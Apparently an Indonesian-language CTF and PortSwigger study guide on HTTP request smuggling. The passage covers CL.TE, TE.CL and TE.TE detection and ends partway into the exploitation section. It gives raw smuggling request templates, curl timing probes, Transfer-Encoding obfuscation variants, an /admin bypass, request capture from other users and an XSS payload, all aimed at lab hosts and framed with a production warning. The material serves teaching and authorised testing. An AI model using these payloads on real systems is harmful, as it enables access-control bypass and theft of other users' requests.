---
id: "31"
title: "🧨 31 — HTTP Request Smuggling Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "31_http_smuggling_workflow.md"
refs_out: ["18","20","22","27","29","30","32"]
refs_in: ["30","32"]
---

← [File 30: API Security](/docs/api-security)

# 🧨 31 — HTTP Request Smuggling Workflow

> **Tujuan:** membangun muscle memory untuk menemukan, memvalidasi, memahami, dan mengeksploitasi **HTTP Request Smuggling** pada CTF dan PortSwigger Web Security Academy.

> **Scope:** HTTP/1.1 request smuggling, CL.TE, TE.CL, TE.TE, HTTP/2 smuggling, detection, Burp Suite, cache poisoning, access-control bypass, request capture pada lab, XSS/open redirect chaining.

---

## 📚 Table of Contents

- [0. Fundamentals](#-0-fundamentals)
    
    - [0.1 Apa Itu HTTP Request Smuggling](#01-apa-itu-http-request-smuggling)
        
    - [0.2 HTTP11-vs-http2-smuggling](#02-http11-vs-http2-smuggling)
        
    - [0.3 Terminologi](#03-terminologi)
        
- [1. Teknik Dasar](#-1-teknik-dasar)
    
    - [1.1 CL.TE](#11-clte-smuggling)
        
    - [1.2 TE.CL](#12-tecl-smuggling)
        
    - [1.3 TE.TE Obfuscation](#13-tete-obfuscation)
        
- [2. Detection](#-2-detection)
    
    - [2.1 Timing-Based](#21-timing-based-detection)
        
    - [2.2 Differential Response](#22-differential-response-detection)
        
    - [2.3 Tools](#23-tools-untuk-detection)
        
    - [2.4 False Positive-vs-True Positive](#24-false-positive-vs-true-positive)
        
- [3. Exploitation](#-3-exploitation)
    
    - [3.1 Bypass Front-End Security Controls](#31-bypass-front-end-security-controls)
        
    - [3.2 Reveal Front-End Request Rewriting](#32-reveal-front-end-request-rewriting)
        
    - [3.3 Capture Other Users' Requests](#33-capture-other-users-requests)
        
    - [3.4 Reflected XSS via Smuggling](#34-reflected-xss-via-smuggling)
        
    - [3.5 Open Redirect via Smuggling](#35-open-redirect-via-smuggling)
        
    - [3.6 Web Cache Poisoning via Smuggling](#36-web-cache-poisoning-via-smuggling)
        
- [4. HTTP/2 Smuggling](#-4-http2-smuggling)
    
- [5. Burp Suite Workflow](#-5-burp-suite-workflow)
    
- [6. Decision Tree](#-6-decision-tree)
    
- [7. Common Errors & Troubleshooting](#-7-common-errors--troubleshooting)
    
- [8. Golden Rules](#-8-golden-rules)
    
- [9. Final Checklist](#-9-final-checklist)
    
- [10. Cross-Workflow](#-10-cross-workflow)
    
- [11. One-Line Muscle Memory](#-11-one-line-muscle-memory)
    

---

# 🧠 0. FUNDAMENTALS

## 0.1 Apa Itu HTTP Request Smuggling

### 📌 Kapan Digunakan

Gunakan workflow ini ketika:

- target menggunakan reverse proxy / load balancer / CDN;
    
- ada front-end proxy dan back-end web server yang berbeda;
    
- request menggunakan HTTP/1.1;
    
- ada indikasi perbedaan parsing `Content-Length` dan `Transfer-Encoding`;
    
- Burp menunjukkan kemungkinan desynchronization;
    
- terdapat HTTP/2 → HTTP/1.1 downgrade;
    
- aplikasi berada di balik stack seperti:
    

```text
Browser
   ↓
CDN / WAF
   ↓
Reverse Proxy
   ↓
Load Balancer
   ↓
Web Server
   ↓
Application
```

### Definisi sederhana

**HTTP Request Smuggling** adalah vulnerability yang muncul ketika dua komponen HTTP dalam satu koneksi **tidak sepakat mengenai batas akhir sebuah request**.

Biasanya:

```text
Front-End:
"Request ini berakhir di sini."

Back-End:
"Tidak. Request ini belum selesai."

atau

Front-End:
"Ini satu request."

Back-End:
"Saya membaca dua request."
```

Perbedaan tersebut disebut:

> **HTTP request desynchronization / HTTP desync.**

---

## 🧃 Analogi Sederhana

Bayangkan seseorang membawa paket:

```text
+-----------------------------------+
| Paket #1                          |
| "Ini seluruh isi paket."         |
+-----------------------------------+
```

Petugas depan menghitung:

```text
Panjang = 10
```

Tetapi petugas belakang mengatakan:

```text
"Jumlah isi paket harus dibaca
berdasarkan format khusus."
```

Jika keduanya menggunakan aturan berbeda:

```text
Front-End
   ↓
membaca 10 byte
   ↓
menganggap request selesai
```

sementara:

```text
Back-End
   ↓
membaca chunked encoding
   ↓
menemukan request tambahan
```

maka sebagian data dapat "tersembunyi" sebagai request berikutnya.

---

## 🔄 Model Mental

```text
Browser
   │
   │ HTTP Request
   ▼
+----------------------+
| Front-End / Proxy    |
|                      |
| Parser A             |
+----------+-----------+
           │
           │ connection
           │
           ▼
+----------------------+
| Back-End / Server    |
|                      |
| Parser B             |
+----------+-----------+
           │
           ▼
      Application
```

Masalah terjadi ketika:

```text
Parser A ≠ Parser B
```

---

## 🚨 Kenapa Dangerous?

Request smuggling dapat digunakan untuk:

- bypass security controls;
    
- melewati URL filtering di front-end;
    
- melewati method restrictions;
    
- request poisoning;
    
- cache poisoning;
    
- access-control bypass;
    
- menyuntikkan request ke koneksi backend;
    
- mengubah request user berikutnya;
    
- mempengaruhi traffic pada shared connection;
    
- chaining ke XSS;
    
- chaining ke open redirect;
    
- mengungkap request rewriting oleh proxy.
    

Namun:

> Request smuggling **bukan sekadar "payload aneh"**.

Esensinya adalah:

```text
Boundary disagreement
        ↓
Connection desynchronization
        ↓
Unexpected request interpretation
```

---

# 📏 Content-Length

Header:

```http
Content-Length: 37
```

berarti:

> body request memiliki **37 byte**.

Contoh:

```http
POST /submit HTTP/1.1
Host: lab.local
Content-Length: 11

hello world
```

Body:

```text
hello world
```

memiliki:

```text
11 byte
```

Maka server dapat mengetahui:

```text
Headers
   ↓
Content-Length: 11
   ↓
baca 11 byte body
   ↓
request selesai
```

---

# 🧩 Transfer-Encoding: chunked

Dengan:

```http
Transfer-Encoding: chunked
```

body tidak diberikan sebagai satu panjang total.

Sebaliknya body dibagi menjadi **chunk**.

Format:

```text
[hex size]\r\n
[data]\r\n
0\r\n
\r\n
```

Contoh:

```text
5\r\n
HELLO\r\n
0\r\n
\r\n
```

Artinya:

```text
5
↓
hexadecimal 5
↓
5 byte data
↓
HELLO
↓
0
↓
tidak ada chunk berikutnya
↓
request body selesai
```

---

## 🔢 Memahami Hexadecimal Chunk Size

Contoh:

```text
A
```

berarti:

```text
10 byte
```

karena:

```text
A(hex) = 10(decimal)
```

Contoh:

```text
10
```

berarti:

```text
16 byte
```

karena:

```text
0x10 = 16
```

---

## ✅ Struktur Chunk Yang Akurat

```text
5\r\n
HELLO\r\n
6\r\n
WORLD!\r\n
0\r\n
\r\n
```

Penjelasan:

```text
5           ← chunk size = 5 byte
\r\n        ← separator

HELLO       ← 5 byte
\r\n        ← separator

6           ← chunk size = 6 byte
\r\n

WORLD!      ← 6 byte
\r\n

0           ← terminating chunk
\r\n
\r\n        ← end of chunked body
```

Secara konseptual:

```text
5\r\nHELLO\r\n6\r\nWORLD!\r\n0\r\n\r\n
```

---

# 💥 Kenapa Parsing Berbeda Menjadi Smuggling?

Misalnya:

```text
Front-End menggunakan:
Content-Length

Back-End menggunakan:
Transfer-Encoding
```

Request:

```text
Client
  │
  ▼
Front-End
  │
  │ "Saya pakai CL."
  ▼
Back-End
  │
  │ "Saya pakai TE."
  ▼
Parser berbeda
```

Akibatnya:

```text
FE boundary
      ↓
      |--------------------|
      
BE boundary
      ↓
      |--------|
               |-----------|
                   ↑
             dianggap request kedua
```

---

# ✅ Kondisi Yang Biasanya Dibutuhkan

Smuggling lebih mungkin terjadi jika terdapat:

```text
1. Shared connection
2. Multiple HTTP parsers
3. HTTP/1.1 request reuse
4. Proxy ↔ backend chain
5. Inconsistent handling of CL/TE
```

Contoh stack:

```text
Internet
   ↓
Cloudflare / CDN
   ↓
Nginx
   ↓
HAProxy
   ↓
Apache
```

Semakin banyak parser berbeda:

```text
Parser A
   ↓
Parser B
   ↓
Parser C
```

semakin penting memahami bagaimana setiap komponen memproses request boundary.

---

# 0.2 HTTP/1.1 vs HTTP/2 Smuggling

## HTTP/1.1

HTTP/1.1 umumnya menentukan request boundary menggunakan:

```text
Content-Length
Transfer-Encoding
Connection semantics
```

Karena itu konflik:

```text
CL ↔ TE
```

merupakan sumber klasik request smuggling.

---

## HTTP/2

HTTP/2 tidak menggunakan framing HTTP/1.1 yang sama.

Data ditransmisikan menggunakan:

```text
Binary frames
Streams
Stream IDs
```

Contoh konseptual:

```text
HTTP/1.1
Request
 ├── Headers
 └── Body

HTTP/2
Connection
 ├── Stream 1
 ├── Stream 3
 ├── Stream 5
 └── Stream 7
```

Tetapi:

> HTTP/2 tidak otomatis berarti "smuggling impossible".

Masalah baru muncul ketika:

```text
HTTP/2 client
      ↓
HTTP/2 front-end
      ↓
downgrade
      ↓
HTTP/1.1 backend
```

---

# H2.CL

Konsep:

```text
HTTP/2
   ↓
front-end interprets request
   ↓
downgrade → HTTP/1.1
   ↓
backend trusts Content-Length
```

Jika attacker dapat memanipulasi framing atau header yang diterjemahkan saat downgrade:

```text
HTTP/2 boundary
       ≠
HTTP/1.1 boundary
```

maka terjadi desync.

---

# H2.TE

HTTP/2 secara normal tidak seharusnya memperlakukan `Transfer-Encoding: chunked` seperti HTTP/1.1.

Jika stack HTTP/2 → HTTP/1.1 melakukan normalisasi/downgrade secara tidak aman:

```text
HTTP/2
   ↓
TE-related header handling
   ↓
HTTP/1.1
   ↓
chunk parser
```

maka muncul kemungkinan H2.TE class.

---

# 🔻 HTTP/2 Downgrade Attacks

Mental model:

```text
Browser
  │
  │ HTTP/2
  ▼
Front-End
  │
  │ downgrade
  ▼
HTTP/1.1
  │
  ▼
Back-End
```

Masalah utama:

```text
HTTP/2 representation
        ≠
HTTP/1.1 representation
```

---

# 0.3 Terminologi

|Term|Definisi|
|---|---|
|Front-End (FE)|Proxy, CDN, WAF, reverse proxy atau load balancer yang menerima request client|
|Back-End (BE)|Server di belakang front-end yang memproses request aplikasi|
|CL|`Content-Length`, menentukan ukuran body|
|TE|`Transfer-Encoding`, mekanisme framing seperti `chunked`|
|Chunk size|Ukuran chunk dalam hexadecimal|
|Poison|Data yang tertinggal di connection dan mempengaruhi request berikutnya|
|Smuggle|Request yang "diselundupkan" melalui parsing discrepancy|
|Timeout-based detection|Menggunakan delay/timeout sebagai indikator parser desync|
|Differential response|Membandingkan response dua request yang sama-sama seharusnya normal|
|Desync|FE dan BE kehilangan sinkronisasi request boundary|
|Connection poisoning|Connection backend memiliki data yang mempengaruhi request berikutnya|

---

# 🔍 1. TEKNIK DASAR

# 1.1 CL.TE Smuggling

## 📌 Kapan Digunakan

Gunakan CL.TE ketika dugaan Anda:

```text
Front-End → Content-Length
Back-End  → Transfer-Encoding
```

Mental model:

```text
FE:
CL wins

BE:
TE wins
```

---

## Diagram

```text
              CLIENT
                 │
                 ▼
       +-------------------+
       | Front-End         |
       | uses CL           |
       +---------+---------+
                 │
                 │
                 ▼
       +-------------------+
       | Back-End          |
       | uses TE           |
       +---------+---------+
                 │
                 ▼
            Application
```

---

## Contoh Detection Request

Gunakan host lab seperti:

```text
lab.local
```

Contoh struktur request:

```http
POST / HTTP/1.1
Host: lab.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

0

```

### Apa yang terjadi?

Front-end yang memprioritaskan:

```text
Content-Length: 4
```

akan memperlakukan body berdasarkan 4 byte.

Back-end yang memprioritaskan:

```text
Transfer-Encoding: chunked
```

akan mencoba membaca:

```text
0\r\n\r\n
```

sebagai terminating chunk.

Konfigurasi sebenarnya bergantung pada implementasi proxy/server.

---

## ⚠️ Perhitungan Byte

Jangan menebak `Content-Length`.

Contoh:

```text
0\r\n\r\n
```

memiliki:

```text
1 byte  → 0
2 byte  → \r\n
2 byte  → \r\n

Total = 5 byte
```

Jadi:

```text
Content-Length: 5
```

merepresentasikan body:

```text
0\r\n\r\n
```

sedangkan:

```text
Content-Length: 4
```

hanya mengirim `0\r\n\r` (tanpa \n terakhir).

> **📌 Kenapa CL: 4 vs 5 Menghasilkan Delay?**
> Ketika FE mengirim `Content-Length: 4`, Front-End memotong data tanpa `\n` terakhir. Back-End yang membaca `Transfer-Encoding: chunked` tidak melihat terminator chunk `0\r\n\r\n` yang lengkap. Akibatnya, Back-End menggantung (*hang*) menunggu LF (`\n`) berikutnya sampai socket timeout (misal 10 detik). Inilah yang memicu **timing-based detection signal** pada CL.TE.

---

## Timing-Based CL.TE

Ide dasar:

```text
FE membaca CL
BE membaca TE

↓
boundary tidak sama

↓
backend menunggu data berikutnya
```

Jika connection tetap terbuka dan backend menunggu request boundary, response dapat tertunda.

---

## Baseline Dulu

Kirim request normal:

```http
POST / HTTP/1.1
Host: lab.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Connection: keep-alive

hello
```

Catat:

```text
Response time = 120 ms
```

Kemudian probe.

Contoh hasil:

```text
Normal:
0.12 s

Probe:
10.01 s
```

Perbedaan besar seperti ini lebih bermakna daripada sekadar:

```text
120 ms → 250 ms
```

---

## Berapa Delay Yang Signifikan?

Tidak ada angka universal.

Gunakan pendekatan:

```text
Baseline
   ↓
ambil beberapa request normal
   ↓
ukur p50 / p95
   ↓
uji probe
   ↓
bandingkan
```

Rule praktis di lab:

```text
< 1 s
→ biasanya noise

1–3 s
→ belum cukup

3–5 s
→ investigasi

> 5 s
→ menarik

~10 s / timeout boundary
→ strong signal pada banyak lab stack
```

Tetapi:

> **"10 detik" bukan bukti absolut.**

Server bisa punya timeout:

```text
2 s
5 s
10 s
15 s
30 s
60 s
```

yang sama sekali tidak terkait smuggling.

---

## Differential Response

Tujuannya:

```text
request 1
   ↓
poison connection
   ↓
request 2
   ↓
response 2 menjadi abnormal
```

Misalnya:

```text
Request #1
```

menyebabkan backend meninggalkan:

```text
GET /admin HTTP/1.1
```

sehingga:

```text
Request #2 → unexpected response
```

---

## curl — Kenapa Sulit & Disclaimer Normalization

> **⚠️ Disclaimer curl Modern (7.x+):**
> Versi `curl` modern sering secara otomatis menolak (*reject*) atau menormalisasi header framing yang berbenturan (seperti mengirim `Content-Length` bersamaan dengan `Transfer-Encoding: chunked`). Hasil pengujian via `curl` dapat bervariasi bergantung pada versi binary dan TLS backend. Untuk pengujian desynchronization yang akurat, **Burp Repeater** adalah tool utama yang direkomendasikan.

`curl` cocok untuk:

```text
normal HTTP testing
headers
methods
timing
HTTP version
```

Tetapi **kurang ideal** untuk request smuggling manual karena:

- library HTTP dapat melakukan normalisasi;
    
- connection reuse dikelola otomatis;
    
- framing mungkin dinormalisasi;
    
- HTTP/2 dapat dipilih otomatis;
    
- malformed ambiguity sulit dipertahankan;
    
- raw CRLF control lebih terbatas;
    
- proxy behavior dapat berubah dari yang Anda inginkan.
    

Contoh normal timing check:

```bash
# Baseline response time
curl -sk -o /dev/null \
  -w 'time_total=%{time_total}\n' \
  https://lab.local/
```

---

## Burp Lebih Ideal

Gunakan:

```text
Burp Proxy
   ↓
Repeater
   ↓
HTTP Request Smuggler
```

karena Burp memungkinkan:

```text
raw request editing
Content-Length control
Transfer-Encoding control
HTTP/1.1 control
connection reuse
response comparison
```

---

## Contoh Response Indikatif

Contoh:

```text
Normal request:

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 842
```

Probe:

```text
HTTP/1.1 408 Request Timeout
```

atau:

```text
HTTP/1.1 502 Bad Gateway
```

atau:

```text
HTTP/1.1 400 Bad Request
```

yang muncul hanya pada request tertentu.

**Catatan:**

```text
408 ≠ otomatis smuggling
502 ≠ otomatis smuggling
400 ≠ otomatis smuggling
```

Kita membutuhkan pola.

---

# 1.2 TE.CL Smuggling

## 📌 Kapan Digunakan

Gunakan ketika dugaan:

```text
Front-End → Transfer-Encoding
Back-End  → Content-Length
```

Mental model:

```text
FE:
TE wins

BE:
CL wins
```

---

## Diagram

```text
CLIENT
  │
  ▼
+-------------------+
| Front-End         |
| parses TE         |
+---------+---------+
          │
          ▼
+-------------------+
| Back-End          |
| parses CL         |
+---------+---------+
          │
          ▼
      Application
```

---

## Detection Request

Contoh valid HTTP/1.1 framing:

```http
POST / HTTP/1.1
Host: lab.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

5
HELLO
0

```

Perhatikan body:

```text
5\r\n
HELLO\r\n
0\r\n
\r\n
```

---

## Cara Construct

Chunk:

```text
5
HELLO
```

berarti:

```text
5 decimal
→ 5 byte
```

Lalu terminator:

```text
0\r\n\r\n
```

Sehingga:

```text
5\r\nHELLO\r\n0\r\n\r\n
```

---

## Kenapa TE.CL Berbeda?

FE dapat melihat:

```text
5
HELLO
0
```

sebagai seluruh chunked body.

Tetapi backend yang menggunakan:

```text
Content-Length: 4
```

akan melihat hanya sebagian awal body sebagai body request pertama.

Sisa byte dapat mempengaruhi parsing request berikutnya.

---

## Timing Probe

Pattern:

```text
Request
   ↓
FE parses TE
   ↓
BE parses CL
   ↓
leftover bytes
   ↓
connection desync
```

Jika backend menunggu lebih banyak data:

```text
Normal = 100 ms
Probe  = 10,000 ms
```

maka perlu investigasi.

---

## curl Timing

```bash
# Uji baseline
curl -sk -o /dev/null \
  -w 'baseline=%{time_total}\n' \
  https://lab.local/

# Kirim request dengan header framing
curl -sk --http1.1 \
  --request POST \
  --header 'Transfer-Encoding: chunked' \
  --header 'Content-Length: 4' \
  --data-binary $'5\r\nHELLO\r\n0\r\n\r\n' \
  -o /dev/null \
  -w 'probe=%{time_total}\n' \
  https://lab.local/
```

> `curl` bisa mengubah/mengelola framing sehingga hasilnya **tidak boleh dianggap setara dengan raw socket atau Burp**.

---

## Contoh Response

Kemungkinan:

```text
HTTP/1.1 200 OK
```

atau:

```text
HTTP/1.1 400 Bad Request
```

atau:

```text
HTTP/1.1 502 Bad Gateway
```

atau timeout.

Yang penting adalah:

```text
pattern konsisten
```

bukan satu response aneh.

---

# 1.3 TE.TE Obfuscation

## 📌 Kapan Digunakan

Kedua sisi mendukung `Transfer-Encoding`, tetapi salah satu parser:

```text
mengabaikan
memperbaiki
menormalisasi
atau gagal mengenali
```

bentuk header tertentu.

Contoh:

```text
FE:
Transfer-Encoding recognized

BE:
Transfer-Encoding variant ignored
```

atau sebaliknya.

---

# 🧪 Variant Yang Perlu Diuji

Minimal:

```text
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding: chunked, chunked
Transfer-Encoding: X
Transfer-Encoding: chunked ;
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding: \x0bchunked
Transfer-Encoding: chunked\t
```

Tambahan yang dapat muncul tergantung parser:

```text
Transfer-Encoding : chunked
Transfer-Encoding: "chunked"
Transfer-Encoding: chunked
 Transfer-Encoding: chunked
Transfer-Encoding: chunked, gzip
```

### ⚠️ Sangat penting

Tidak semua variant adalah:

```text
HTTP-valid
```

atau:

```text
semantically equivalent
```

Sebagian sengaja malformed untuk menguji parser discrepancy.

---

## Test Matrix

Buat tabel:

|Variant|FE Result|BE Result|Delay|Response|Status|
|---|---|---|---|---|---|
|`chunked`|chunked|chunked|120ms|200|baseline|
|`xchunked`|ignored|chunked|130ms|200|check|
|`chunked, chunked`|normalized|error|400ms|400|check|
|`X`|ignored|ignored|150ms|200|no signal|
|`chunked ;`|normalized|ignored|9s|timeout|interesting|
|`identity, chunked`|chunked|identity|10s|timeout|interesting|
|`chunked, identity`|identity|chunked|10s|timeout|interesting|
|`\x0bchunked`|ignored|chunked|8s|timeout|interesting|

---

## curl Variant Testing

```bash
# Variant 1: normal chunked
curl -sk --http1.1 \
  -H 'Transfer-Encoding: chunked' \
  -H 'Content-Length: 4' \
  --data-binary $'0\r\n\r\n' \
  https://lab.local/

# Variant 2: xchunked
curl -sk --http1.1 \
  -H 'Transfer-Encoding: xchunked' \
  -H 'Content-Length: 4' \
  --data-binary $'0\r\n\r\n' \
  https://lab.local/

# Variant 3: duplicate chunked
curl -sk --http1.1 \
  -H 'Transfer-Encoding: chunked, chunked' \
  -H 'Content-Length: 4' \
  --data-binary $'0\r\n\r\n' \
  https://lab.local/

# Variant 4: uppercase/alternate token
curl -sk --http1.1 \
  -H 'Transfer-Encoding: X' \
  -H 'Content-Length: 4' \
  --data-binary $'0\r\n\r\n' \
  https://lab.local/
```

> Untuk pengujian TE.TE yang benar-benar sensitif terhadap whitespace, duplicate headers, atau byte-level formatting, **gunakan Burp Repeater/HTTP Request Smuggler atau raw socket**, bukan `curl`.

---

# 🔎 2. DETECTION

# 2.1 Timing-Based Detection

## 📌 Kapan Digunakan

Timing detection berguna ketika:

```text
response body tidak membantu
status code biasa
backend tidak echo request
```

dan Anda ingin melihat:

```text
connection stall
backend waiting
timeout
```

---

## Step 1 — Baseline

Kirim 5–10 request biasa.

Contoh:

```text
0.11
0.12
0.10
0.13
0.11
0.12
```

Maka kira-kira:

```text
baseline ≈ 100–130 ms
```

---

## Step 2 — Probe

Kirim:

```text
CL.TE probe
```

Catat:

```text
9.99 s
```

Kemudian ulangi:

```text
9.98 s
10.01 s
9.99 s
```

Pola konsisten jauh lebih kuat.

---

## Step 3 — Compare

```text
Baseline:
~0.12 s

Probe:
~10.0 s

Difference:
~9.88 s
```

Ini sangat berbeda dari random network jitter.

---

## TE.CL

Ulangi:

```text
baseline
   ↓
TE.CL probe
   ↓
measure
```

---

# ⏱️ Timeout Normal vs Smuggling

### Timeout normal biasanya:

```text
acak
sekali-sekali
berkorelasi dengan network
```

### Smuggling signal biasanya:

```text
reproducible
specific payload
specific parser combination
consistent delay
```

---

## Stronger Evidence

Contoh:

```text
Baseline:
0.12
0.11
0.13

CL.TE:
10.02
10.01
9.99

Control:
0.12
0.11
0.12
```

Ini jauh lebih kuat daripada:

```text
baseline 0.2 s
probe 0.5 s
```

---

# 2.2 Differential Response Detection

## 📌 Kapan Digunakan

Gunakan saat Anda ingin membuktikan:

```text
request boundary benar-benar berubah
```

bukan sekadar timeout.

---

## Model

```text
Request A
   ↓
poison
   ↓
Backend connection
   ↓
Request B
   ↓
unexpected response
```

---

## Pola

Misalnya Request B seharusnya:

```text
GET / HTTP/1.1
```

tetapi mendapatkan:

```text
HTTP/1.1 404
```

atau:

```text
HTTP/1.1 403
```

secara konsisten hanya setelah poison.

---

## Response yang Menarik

Cari:

```text
400
403
404
405
408
409
413
421
429
500
502
503
504
```

Tetapi:

> tidak ada status code yang secara otomatis berarti request smuggling.

Yang penting:

```text
Before:
normal

After poison:
abnormal

Repeat:
same pattern
```

---

# 2.3 Tools untuk Detection

## Burp Suite HTTP Request Smuggler

### 📌 Kapan Digunakan

Gunakan untuk:

- automated detection;
    
- CL.TE testing;
    
- TE.CL testing;
    
- TE.TE ambiguity;
    
- timing/differential checks;
    
- HTTP/2 smuggling checks.
    

### Install

Di Burp:

```text
Extender
   ↓
BApp Store
   ↓
HTTP Request Smuggler
   ↓
Install
```

Setelah install:

```text
Proxy
Repeater
Extensions
```

tergantung versi Burp.

---

# Manual Burp Repeater

Gunakan bila:

```text
automated result = inconclusive
```

Flow:

```text
Browser
  ↓
Proxy
  ↓
capture request
  ↓
Send to Repeater
  ↓
edit framing
  ↓
send
  ↓
compare
```

---

# curl Limitasi

`curl` sulit karena:

```text
application-layer framing
connection management
header normalization
HTTP/2 defaults
```

Untuk normal API:

```text
curl = excellent
```

Untuk byte-level request smuggling:

```text
curl = secondary tool
```

---

# HTTP Toolkit

HTTP Toolkit dapat berguna untuk:

```text
HTTP inspection
request replay
HTTP/2 visibility
traffic analysis
```

Tetapi untuk deep smuggling testing:

```text
Burp + HTTP Request Smuggler
```

umumnya lebih praktis.

---

# 2.4 False Positive vs True Positive

## ❌ False Positive

Contoh:

```text
Probe = 10 s
```

tetapi ternyata:

```text
backend normal timeout = 10 s
```

Maka:

```text
10 s ≠ otomatis smuggling
```

---

## ✅ True Positive

Lebih kuat jika:

```text
1. baseline normal
2. specific payload menyebabkan delay
3. repeatable
4. alternate payload tidak delay
5. second request menunjukkan side effect
6. parser behavior konsisten
```

---

## Confirmation Sequence

```text
Timing
  ↓
Repeat
  ↓
Control payload
  ↓
Differential behavior
  ↓
Manual Burp validation
  ↓
Automated confirmation
```

---

# ⚠️ PRODUCTION WARNING

**JANGAN test HTTP Request Smuggling di production tanpa izin eksplisit.**

Alasannya:

```text
Poisoned connection
       ↓
request berikutnya
       ↓
dapat ikut terpengaruh
```

Jika connection digunakan oleh user lain:

```text
Your payload
     ↓
shared backend connection
     ↓
other user's request
```

maka request mereka dapat:

- dipotong;
    
- diprefix;
    
- diarahkan;
    
- memperoleh response yang salah;
    
- mengalami error;
    
- terkena cache poisoning;
    
- atau data sensitif dapat terekspos.
    

---

# 💥 3. EXPLOITATION

# 3.1 Bypass Front-End Security Controls

## 📌 Kapan Digunakan

Setelah Anda memastikan:

```text
desync benar-benar terjadi
```

baru pikirkan:

```text
Apa security control yang hanya ada di FE?
```

Contoh:

```text
FE blocks /admin
BE allows /admin
```

---

## Flow

```text
Attacker
   │
   ▼
Front-End
   │
   │ sees allowed request
   ▼
Back-End
   │
   │ interprets smuggled request
   ▼
/admin
```

---

## Contoh Lab Concept

Front-end:

```text
deny /admin
```

tetapi backend:

```text
/admin → 200
```

Normal:

```http
GET /admin HTTP/1.1
Host: lab.local
Connection: keep-alive

```

Response:

```text
HTTP/1.1 403 Forbidden
```

Dengan smuggling, request `/admin` dapat disisipkan ke boundary yang berbeda sehingga rule FE tidak memeriksa request tersebut dengan cara yang sama.

---

## Path Restriction

Misalnya FE memblok:

```text
/internal
/admin
/debug
```

tetapi backend menerima:

```text
/internal/status
```

Ini dapat menjadi chaining:

```text
Smuggling
   ↓
FE bypass
   ↓
Internal endpoint
```

---

## Method Restriction

FE:

```text
BLOCK DELETE
```

Backend:

```text
DELETE /api/user/1
```

dapat menjadi target investigasi.

Jangan langsung mengubah data pada lab yang bukan milik Anda.

Gunakan endpoint synthetic seperti:

```text
DELETE /lab/test-object
```

---

# 🧪 Raw HTTP Concept

> Payload di bawah adalah **template lab**. Struktur exact smuggle request tergantung bagaimana FE dan BE melakukan framing.

```http
POST / HTTP/1.1
Host: lab.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin HTTP/1.1
Host: lab.local

```

Mental model:

```text
FE:
┌─────────────────────┐
│ POST /               │
└─────────────────────┘

BE:
┌───────────────┐
│ POST /        │
└───────────────┘
       +
┌───────────────┐
│ GET /admin    │
└───────────────┘
```

**Jangan mengasumsikan angka `Content-Length` di atas universal.**  
Byte count harus dihitung ulang untuk setiap payload.

---

# 3.2 Reveal Front-End Request Rewriting

## 📌 Kapan Digunakan

Gunakan saat Anda ingin mengetahui:

```text
Apa yang ditambahkan FE?
Apa yang diubah FE?
Header internal apa yang ada?
```

Contoh:

```text
X-Forwarded-For
X-Real-IP
X-Forwarded-Host
X-Forwarded-Proto
Authorization
internal routing headers
```

---

## Capture Endpoint

Gunakan endpoint milik Anda sendiri, misalnya:

```text
http://127.0.0.1:8080/capture
```

atau lab service:

```text
capture.lab.local
```

Endpoint harus menampilkan:

```text
method
path
headers
body
```

---

## Flow

```text
Client
   ↓
Front-End
   │
   │ adds:
   │ X-Forwarded-For
   │ X-Internal-Route
   ▼
Back-End
   ↓
Capture Endpoint
```

---

## Response Yang Dicari

Misalnya capture endpoint menerima:

```text
Host: capture.lab.local
X-Forwarded-For: 10.0.2.15
X-Forwarded-Proto: https
X-Internal-Route: app-cluster-a
```

Maka Anda belajar:

```text
FE rewrites request
```

---

## Kenapa Penting?

Request rewriting dapat mengungkap:

```text
internal topology
proxy identity
routing
protocol
trusted IP headers
```

Tetapi jangan menyimpulkan:

```text
X-Forwarded-For exists
→ authentication bypass
```

Header harus diuji terhadap:

```text
trust boundary
```

---

# 3.3 Capture Other Users' Requests

## 📌 Kapan Digunakan

**Hanya pada lab/CTF atau environment yang secara eksplisit memberi izin untuk pengujian request capture.**

Tujuannya memahami:

```text
connection poisoning
```

bukan mengambil data user nyata.

Gunakan **synthetic accounts dan dummy secrets**.

---

## Flow

```text
Attacker
   │
   │ poison request
   ▼
Front-End
   │
   ▼
Shared Backend Connection
   │
   ├── Attacker request
   │
   └── Victim/lab-user request
             │
             ▼
       attacker-controlled
       lab endpoint
```

---

## Konsep

Smuggled request diarahkan ke endpoint yang Anda kontrol dalam lab:

```text
/capture
```

Endpoint tersebut mencatat:

```text
method
path
headers
body
```

Contoh synthetic data:

```text
X-Lab-User: user02
X-Lab-Token: TEST-ONLY-123
```

---

## Raw HTTP Lab Concept

```http
POST / HTTP/1.1
Host: lab.local
Content-Length: 6
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /capture HTTP/1.1
Host: capture.lab.local

```

Setelah itu, lab victim generator dapat mengirim request synthetic seperti:

```http
GET /profile HTTP/1.1
Host: lab.local
X-Lab-User: user02
X-Lab-Token: TEST-ONLY-123
Connection: keep-alive

```

---

## Timing

Shared connection dapat membutuhkan:

```text
attacker poison
        ↓
victim request
        ↓
backend reuses connection
        ↓
capture
```

Timing harus dipahami melalui lab.

Jangan melakukan:

```text
real victim
real session cookie
real authorization token
```

---

## Extract Captured Data

Capture endpoint dapat menghasilkan:

```text
Method: GET
Path: /profile
X-Lab-User: user02
X-Lab-Token: TEST-ONLY-123
```

Tujuan latihan:

```text
buktikan desync
buktikan request capture
```

bukan mengumpulkan credential pihak lain.

---

# 3.4 Reflected XSS via Smuggling

## 📌 Kapan Digunakan

Chain:

```text
Smuggling
   ↓
bypass FE
   ↓
reach vulnerable endpoint
   ↓
XSS
```

---

## Contoh Flow

```text
FE blocks suspicious path
          │
          ▼
   smuggled request
          │
          ▼
     /search?q=...
          │
          ▼
      reflected
          │
          ▼
          XSS
```

---

## Lab Payload

Gunakan payload benign:

```text
<script>alert(1)</script>
```

Contoh endpoint:

```http
GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Host: lab.local

```

Tujuan:

```text
prove execution
```

bukan mengambil cookie.

---

# 3.5 Open Redirect via Smuggling

